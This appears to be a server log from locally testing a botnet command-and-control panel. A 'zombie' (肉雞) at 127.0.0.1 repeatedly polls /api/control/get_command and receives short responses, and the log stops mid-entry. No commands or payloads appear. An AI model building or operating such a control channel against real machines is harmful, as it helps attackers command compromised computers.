2025-06-24 23:28:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
